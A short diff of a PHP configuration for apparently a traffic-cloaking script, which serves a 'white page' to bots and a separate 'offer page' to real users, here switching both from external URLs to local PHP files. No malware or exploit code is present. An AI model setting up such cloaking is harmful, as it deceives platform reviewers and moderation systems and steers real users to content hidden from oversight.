@@ -11,10 +11,10 @@ $fake_allowed_host = $_SERVER['HTTP_HOST'];
 $config['debug'] = false;
 
 /* PHP/HTML file or URL used for bots */
-$config['default_white_page'] = 'https://www.idntimes.com/tech/trend/izza-namira-1/cara-menambah-followers-instagram-yang-real';
+$config['default_white_page'] = 'backend.php';
 
 /* PHP/HTML file or URL offer used for real users */
-$config['default_offer_page'] = 'https://inti.revopedia.app/';
+$config['default_offer_page'] = 'main.php';
 
 /* WHITE_PAGE render method. Available options: curl, 302 */
 /* 'curl' - uses a server request to display third-party whitepage on your domain */
